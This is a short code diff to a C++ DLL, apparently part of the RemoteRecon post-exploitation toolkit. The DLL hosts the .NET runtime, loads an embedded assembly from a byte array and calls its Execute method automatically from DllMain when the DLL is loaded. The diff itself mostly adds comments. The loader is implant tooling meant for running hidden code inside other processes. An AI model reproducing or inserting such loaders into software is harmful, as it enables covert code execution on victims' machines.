@@ -8,15 +8,18 @@
 void LoadAndRun(LPVOID lpParam)
 {
 	clr::ClrDomain domain;
-	char* argument = "Replace-Me  ";
+	char* argument = "Replace-Me  "; /*Patched by RemoteReconCore*/
 
+	//Load the RemoteReconKS byte array into a vector
 	std::vector<uint8_t> vec(RemoteReconKS_dll, RemoteReconKS_dll + REMOTERECONKS_dll_len);
+	//Load the assembly into the app domain
 	auto res = domain.load(vec);
 
 	if (!res) {
 		exit(0);
 	}
 
+	//Call the public static Execute method for the selected module
 	res->invoke_static(L"RemoteReconKS.RemoteReconKS", L"Execute", argument);
 }
 
@@ -29,7 +32,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 	{
 	case DLL_PROCESS_ATTACH:
 	case DLL_THREAD_ATTACH:
-		//MessageBox(0, "Testing Native Dll", "Native", MB_OK);
+		//Load and Run the RemoteReconKS assembly once the dll has been loaded
 		LoadAndRun(NULL);
 		break;
 	case DLL_THREAD_DETACH:
